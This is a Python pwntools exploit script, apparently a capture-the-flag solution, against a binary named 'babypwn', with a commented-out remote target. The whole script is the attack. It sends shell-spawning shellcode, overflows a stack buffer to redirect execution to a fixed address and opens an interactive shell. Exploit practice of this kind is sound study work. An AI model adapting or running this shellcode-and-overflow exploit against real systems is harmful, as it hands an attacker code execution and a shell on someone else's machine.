from pwn import *

p = process('./babypwn')
#p = remote('stack.overflow.fail',9000)
#context.log_level = 'debug'
elf = ELF('./babypwn')
context.arch = 'amd64'
p.recvuntil('What is your name?\n')
payload = asm(shellcraft.sh())
p.send(payload+'\n')
p.sendline('+')
payload2 = '1'*79 + '\x2a' + 'A'*8 + p64(0x601080)
p.sendline(payload2)
p.sendline('22222222')
p.interactive()
